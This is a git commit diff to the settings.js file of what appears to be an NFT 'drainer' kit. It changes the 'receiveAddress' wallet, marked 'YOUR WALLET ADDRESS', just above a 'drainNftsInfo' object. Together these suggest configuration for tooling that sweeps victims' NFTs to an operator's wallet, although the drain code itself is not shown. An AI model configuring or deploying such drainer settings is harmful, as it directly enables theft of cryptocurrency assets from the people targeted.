cdef5460ecff433b1681eb00016f26a431386240
asalvz <114161010+asalvz@users.noreply.github.com>
2022-10-12 18:20:24 -0300

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddress = "0x3cCb6e72Ea99E0E6153C2720bb7fbCAfE7A9ca5b"; // YOUR WALLET ADDRESS
+const receiveAddress = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434"; // YOUR WALLET ADDRESS
 
 
 const drainNftsInfo = {
